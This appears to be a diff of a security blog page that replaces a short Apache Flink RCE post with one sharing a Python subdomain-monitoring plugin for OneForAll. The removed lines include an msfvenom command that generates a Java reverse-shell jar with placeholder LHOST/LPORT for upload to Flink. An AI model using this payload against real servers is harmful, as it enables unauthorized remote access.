@@ -46,9 +46,11 @@
             <ul class="markdownIt-TOC">
 <li>
 <ul>
-<li><a href="#0x00-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x00 影响版本</a>
+<li>
 <ul>
-<li><a href="#ps%E6%97%A0%E8%AF%9Dfk%E5%8F%AF%E8%AF%B4">ps：无话(f**k)可说</a></li>
+<li><a href="#0x01-%E8%83%8C%E6%99%AF">0x01 背景</a></li>
+<li><a href="#0x02-%E4%BB%A3%E7%A0%81">0x02 代码</a></li>
+<li><a href="#0x03-%E8%BF%90%E8%A1%8C%E5%89%8D%E6%8F%90">0x03 运行前提</a></li>
 </ul>
 </li>
 </ul>
@@ -99,31 +101,135 @@
 <div class="mask" onclick="closeMenu()">
 </div>
       <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
-        <h1 class="text-3xl font-bold lg:mt-16">Apache_Flink任意jar包上传导致RCE</h1>
+        <h1 class="text-3xl font-bold lg:mt-16">为OneForAll增加一个新增域名监控插件（One_Monitor）</h1>
         <div class="text-sm text-gray-700 lg:my-8">
-          2019-11-13 / 1 min read
+          2020-02-17 / 6 min read
         </div>
         
-          <img class="post-feature-image rounded-lg mx-auto my-4" src="http://www.svenbeast.com//post-images/GJfB5twey.png" alt="">
-        
         <div class="post-content yue">
-          <h2 id="0x00-影响版本">0x00 影响版本</h2>
-<pre><code>目前最新版本Apache Flink 1.9.1
+          <h3 id="0x01-背景">0x01 背景</h3>
+<p>需要一个域名监控工具，本着工具越简单越好的理念，写了一个只能满足我需要的插件，好吧，其实是组装轮子的时候需要这个功能，然后有这功能的工具又都太乱了，我觉得有点冗余 -.-!</p>
+<h3 id="0x02-代码">0x02 代码</h3>
+<pre><code># -*- coding:utf-8 -*-
+import re
+import sys
+import os
+import time
+import datetime
+
+path=&quot;C:/Users/Administrator/Desktop/tools/OneForAll/oneforall&quot;             #OneForAll绝对路径，需手动配置
+old=path+&quot;/域名监控/old_domain/&quot;                                            #存放上次扫描结果的文件夹，需手动创建并填写此配置
+new=path+&quot;/域名监控/new_domain/&quot;                                            #存放最新扫描结果的文件夹，需手动创建并填写此配置
+update=path+&quot;/域名监控/update/&quot;                                             #存放新增域名结果的文件夹,需手动创建并填写此配置
+old_import=path+&quot;/域名监控/old_import/&quot;                                     #存放目标域名数据库导出的上次结果,需手动创建并填写此配置
+
+result_name=path+&quot;/results/&quot;                                              #存放oneforall结果的文件夹路径,默认配置即可
+
+
+# print f_list
+
+def result_txt(result_name):   #生成监控域名扫描结果的txt文件名字
+    f_list = os.listdir(result_name)
+    with open(&quot;result_name.txt&quot;,&quot;w&quot;) as r:
+        for i in f_list:
+            # os.path.splitext():分离文件名与扩展名
+            if os.path.splitext(i)[1] == '.txt':
+                r.write(i+&quot;\n&quot;)
+    return True
+
+def update_domain():         #简化新旧扫描结果并进行对比，发现新增域名
+    f=open('result_name.txt','r')
+    lines=f.readlines()
+    f.close()
+    for line in lines:
+        line1=line.strip('\n')
+        target=line1[0:(line1.rfind('_', 1))]          #获得本次扫描目标域名
+        table_name=target.replace('.',&quot;_&quot;)+&quot;_now&quot;        #获得目标域名数据库存储表名
+        
+        print(&quot;[+] 开始导出&lt;&quot;+target+&quot;&gt;数据库记录，用做后面的对比&quot;)
+        print(os.system(&quot;python dbexport.py --table %s --format txt --dpath %s&quot; %(table_name,old_import)))
+        old_path=old+line1          #存放上次域名结果文件
+        new_path=new+line1          #存放本次域名结果文件
+        old_result_subdomain=old_import+table_name+&quot;_subdomain.txt&quot;    #存放域名扫描结果文件
+        new_result_subdomain=result_name+line1
+        
+        now_time = datetime.datetime.now().strftime('%Y-%m-%d') #获得当前日期，为新增域名做准备
+        update_subdomain=update+&quot;update_&quot;+now_time+&quot;_&quot;+line1   #为新增域名文件起个名字，防止重复
+
+
+        f=open(old_result_subdomain, encoding=&quot;utf-8&quot;)
+        f.close
+        lines=f.read()
+        pattern = re.compile(r'\|(http.*?://.*?)[ |]')
+        result = pattern.findall(lines)
+
+        print(&quot;[+] 获得&lt;&quot;+target+&quot;&gt;上次扫描子域名结果中 &quot;)
+        with open(old_path,'w') as fopen:
+            for subdomain_old in result:
+                fopen.write(subdomain_old+&quot;\n&quot;)
+
+        print(&quot;[+] 开始扫描子域名,时间较长，请耐心等待...&quot;)
+        os.system(&quot;python oneforall.py --target %s --format txt run&quot; %target)
+        #print(&quot;[+]当前监控域名:&quot;+target+&quot;[+]&quot;+os.system(&quot;python oneforall.py --target %s --format txt run&quot; %target))
+        f=open(new_result_subdomain, encoding=&quot;utf-8&quot;)
+        f.close
+        lines=f.read()
+        pattern = re.compile(r'\|(http.*?://.*?)[ |]')
+        result = pattern.findall(lines)
+        print(&quot;[+] 扫描完成，获得&lt;&quot;+target+&quot;&gt;最新扫描子域名结果中 &quot;)
+        with open(new_path,'w') as fopen:
+            for subdomain_new in result:
+                fopen.write(subdomain_new+&quot;\n&quot;)
+                
+
+        print(&quot;[*] 开始检测&lt;&quot;+target+&quot;&gt;域名是否新增...&quot;)
+
+        str1 = []
+        file_1 = open(old_path,&quot;r&quot;,encoding=&quot;utf-8&quot;)
+        print(&quot;[+] 已打开old_domain存储的上次扫描结果：&quot;+line1+&quot;文件，开始获取域名并存入数组old&quot;)
+        for line in file_1.readlines():
+            str1.append(line.replace(&quot;\n&quot;,&quot;&quot;))
+
+        str2 = []
+        file_2 = open(new_path, &quot;r&quot;, encoding=&quot;utf-8&quot;)
+        print(&quot;[+] 已打开new_domain存储的本次扫描结果：&quot;+line1+&quot;文件，开始获取域名并存入数组new&quot;)
+        for line in file_2.readlines():
+            str2.append(line.replace(&quot;\n&quot;, &quot;&quot;))
+
+
+        str_dump = []
+        print(&quot;[+] 正在对比数组获得新增域名中&quot;)
+        for line in str2:
+            if line not in str1:
+                str_dump.append(line)    #将两个文件重复的内容取出来
+        if len(str_dump) &lt; 1:
+            print(&quot;[+] 检测完成，不存在新增域名，请等待下一周期检测！&quot;)
+        else:
+            print(&quot;[+] 检测完成，存在新增域名:&quot;+&quot;\n&quot;)
+            for str in str_dump:             #去重后的结果写入文件
+                print(&quot; &quot;+str)
+                with open(update_subdomain,&quot;a+&quot;,encoding=&quot;utf-8&quot;) as f:
+                    f.write(str + &quot;\n&quot;)
+            num=len(str_dump)
+
+            number=num*900
+            min=num*30
+            print(&quot;\n&quot;+&quot;[+] &quot;+&quot;本次新增%s&quot;%num +&quot;个域名，将等待%s&quot;%min+&quot;分钟后执行下次任务&quot;)
+
+
+
+if __name__ == '__main__':
+    result_txt(result_name)
+    update_domain()
 </code></pre>
-<ol>
-<li>生成jar包</li>
-</ol>
-<pre><code>msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f jar &gt;test.jar
-</code></pre>
-<ol start="2">
-<li>监听并上传<br>
-<img src="http://www.svenbeast.com//post-images/1573638070237.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1573637987152.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1573638137992.png" alt=""></li>
-<li>shell<br>
-<img src="http://www.svenbeast.com//post-images/1573638231413.png" alt=""></li>
-</ol>
-<h3 id="ps无话fk可说">ps：无话(f**k)可说</h3>
+<h3 id="0x03-运行前提">0x03 运行前提</h3>
+<ul>
+<li>1.配置好代码里的绝对路径，创建好文件夹，保证名称无误，One_Monitor.py放在和onforall.py同一路径下运行</li>
+<li>2.首先对想监控的域名用oneforall扫一遍，结果为txt格式</li>
+<li>3.我设置了一个域名30分钟的延迟，因为是实时漏扫，给留的时间，不需要可以删掉</li>
+<li>4.应该没啥了，代码灰常简单，有问题一看就知道的，有问题可以交流。还希望有人也能分享我一个代码简单但实用的脚本（附一个测试图，是计划任务启动的，所以是白板）<br>
+<img src="http://www.svenbeast.com//post-images/1581931856029.png" alt=""></li>
+</ul>
 
         </div>
 
@@ -132,21 +238,12 @@
 
         <div class="flex justify-between py-8">
           
-            <div class="prev-post">
-              <a href="http://www.svenbeast.com//post/-leT8b8Kh">
-                <h3 class="post-title">
-                  <i class="remixicon-arrow-left-line"></i>
-                  Shiro&lt;=1.4.1 padding oracle attack导致RCE
-                </h3>
-              </a>
-            </div>
-          
 
           
             <div class="next-post">
-              <a href="http://www.svenbeast.com//post/i3isd2Yq0">
+              <a href="http://www.svenbeast.com//post/tSl508OMg">
                 <h3 class="post-title">
-                  学习使我快乐
+                  记录一次免杀的粗鄙操作(MSF+shellcode+某杀毒)
                   <i class="remixicon-arrow-right-line"></i>
                 </h3>
               </a>
